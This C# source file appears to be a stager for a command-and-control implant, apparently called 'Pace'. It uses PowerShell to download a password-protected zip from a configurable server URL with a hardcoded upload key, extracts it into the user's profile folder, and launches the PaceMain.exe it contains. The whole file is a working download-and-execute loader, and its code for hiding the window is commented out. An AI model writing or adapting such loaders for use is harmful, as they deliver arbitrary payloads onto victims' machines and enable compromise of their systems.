using System;
using System.IO;
using System.Linq;
using System.Text;
using Newtonsoft.Json;
using System.Net.Http;
using System.Threading;
using System.Diagnostics;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Runtime.Serialization.Formatters.Binary;
using System.Net;
using System.Globalization;
using System.Security.Principal;
using System.IO;
using Ionic.Zip;

namespace PacemakerStager
{
    internal class Program {

        public static string url = "http://localhost:3000";

        public static void DownloadFile()
        {
            string userPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

            if (!File.Exists(userPath + "\\outpaced09120912.zip"))
            {
                Process process = new Process();
                process.StartInfo.FileName = "powershell.exe";
                process.StartInfo.RedirectStandardInput = true;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.UseShellExecute = false;
                /*process.StartInfo.CreateNoWindow = true;
                process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;*/

                process.Start();
                process.StandardInput.WriteLine("$url = \"" + url + "/files/getFile?filename=pace.zip&uploadkey=UPsl1d3PACEPWN\"");
                process.StandardInput.WriteLine("$path = $env:USERPROFILE + \"\\outpaced09120912.zip\"");
                process.StandardInput.WriteLine("$client = New-Object System.Net.WebClient; $client.DownloadFile($url, $path)");
                process.StandardInput.Flush();
                process.StandardInput.Close();
                process.WaitForExit();

                string stdout = process.StandardOutput.ReadToEnd();

                Console.WriteLine(stdout);
            }
        }

        public static void MakeFolderAndExtractZipFileContentsIntoit()
        {
            // Get the path to the %user% directory
            string userPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

            // Combine the user path with the folder name "new"
            string folderPath = Path.Combine(userPath, "outpaced09120912");

            // Specify the path to the password-protected ZIP file
            string zipFilePath = Path.Combine(userPath, "outpaced09120912.zip");

            // Password for the ZIP file
            string password = "pace123";

            try
            {
                // Check if the "new" folder exists
                if (!Directory.Exists(folderPath))
                {
                    Directory.CreateDirectory(folderPath);
                    Console.WriteLine("Folder 'outpaced09120912' created successfully in %user% directory.");
                }

                // Check if the ZIP file exists
                if (!File.Exists(zipFilePath))
                {
                    Console.WriteLine("The ZIP file 'outpaced09120912.zip' does not exist.");
                    return;
                }

                // Extract the contents of the password-protected ZIP file into the "new" folder
                using (ZipFile zip = ZipFile.Read(zipFilePath))
                {
                    zip.Password = password;
                    zip.ExtractAll(folderPath);
                }

                Console.WriteLine("ZIP file 'outpaced09120912.zip' extracted successfully to the 'new' folder.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error extracting ZIP file: {ex.Message}");
            }
        }
        public static void FinalStep()
        {

            string userPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

            // Combine the user path with the folder name "new"
            string exePath = Path.Combine(userPath, "outpaced09120912\\PaceMain.exe");

            try
            {
                var startInfo = new ProcessStartInfo(exePath);
                startInfo.UseShellExecute = true;
                Process.Start(startInfo);
                Environment.Exit(0);

                Console.WriteLine("Executable has been executed.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error executing the executable: {ex.Message}");
            }
        }
        public static void Main(string[] args)
        {
            DownloadFile();
            MakeFolderAndExtractZipFileContentsIntoit();
            FinalStep();
        }
    }
}
